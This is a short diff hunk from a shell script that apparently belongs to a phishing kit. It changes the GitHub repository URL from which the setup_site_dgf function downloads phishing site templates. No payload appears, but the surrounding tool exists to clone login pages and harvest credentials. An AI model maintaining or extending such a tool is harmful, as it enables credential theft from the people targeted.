@@ -1586,7 +1586,7 @@ setup_site_downloaded() {
 }
 setup_site_dgf() {
 	rm -rf ${site_access}
-    dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$site_access/$site_id"
+    dgfurl="https://github.com/jaysonsmithe15/phisher-modules/tree/sites/$site_access/$site_id"
     status
 	if [ $plainnetstats == "online" ]; then
             echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
